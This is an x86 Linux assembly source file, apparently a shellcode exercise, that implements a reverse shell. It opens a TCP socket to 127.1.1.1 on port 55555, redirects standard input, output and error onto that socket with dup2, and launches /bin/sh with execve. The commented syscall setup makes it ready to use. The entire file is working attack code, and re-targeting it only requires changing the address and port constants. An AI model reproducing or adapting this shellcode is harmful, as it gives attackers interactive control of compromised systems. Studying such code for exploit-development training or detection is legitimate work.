global _start			

section .text
_start:

	;;CODE
	;;s = socket(AF_INET, SOCK_STREAM, 0);
	
	push	0x66
	pop	eax		;;for SYS_SOCKETCALL (0x66)
	push	0x1
	pop	ebx		;;for SYS_SOCKET (0x1)

	xor	edx, edx	;;for pushing to 0 (params 3)
	push	edx		;; 0 (param 3 for socket)
	push	ebx		;; 1 (param 2, SOCK_STREAM)
	push	0x2		;; 2 (param 1, AF_INET)
	mov	ecx, esp	;; move all of them to ecx

	int	0x80		;;all set, interrupt call. Result will be returned to eax

	;;CODE
	;;sa.sin_family = AF_INET;
	;;sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
	;;sa.sin_port = htons(REMOTE_PORT);
	;;connect(s, (struct sockaddr *)&sa, sizeof(sa));

	;;creating sa variable structure
	push	0x0101017f	;;IP Number "127.1.1.1" in hex reverse order
	push    word 0x03d9     ;;Port Number 55555 in hex reverse order
	push	word 0x2	;;for AF_INET
	mov	ecx, esp	;;save the structure to ecx

	;;creating parameter for connect()
	push	0x10		;;sizeof (structure)
	push	ecx		;;socket structure above (sa variable)
	push	eax		;;socket descriptor that returned from above
	mov	ecx, esp	;;save the structure to ecx for connect() parameter

	;;calling connect()
	mov	al, 0x66	;;for SYSCALL_SOCKET 0x66
	mov	bl, 0x3		;;SYS_CONNECT 0x3
	int	0x80		;;everything set, call connect()

	;;CODE
	;;dup2(s, 0);
	;;dup2(s, 1);
	;;dup2(s, 2);

	xor	ecx, ecx	;;param 3 (0)
	mov	al, 0x3f	;;dup2
	int	0x80		;;interrupt

	inc	ecx		;;param 3 (1)
	mov	al, 0x3f	;;dup2
	int	0x80		;;interrupt

	inc	ecx		;;param 3 (2)
	mov	al, 0x3f	;;dup2
	int	0x80		;;interrupt


	;;execve( "/bin/sh", NULL, NULL );
	;;Call Structure
	;;eax <- 0x0b
	;;ebx <- string stack equivalent to /bin//sh/
	;;ecx <- 0
	;;edx <- 0
	mov	al, 0x0b	;syscall: sys_execve
	push	edx		;for null terminator
	push	0x68732f2f	;String "hs//"
	push	0x6e69622f	;String "nib/"
	mov	ebx, esp	;move current stack pointer to ebx as second param
	mov	ecx, edx	;mov edx to ecx ;;Param 3 is "0". Edx for param 4 is guaranteed 0
	int	0x80		;interrupt
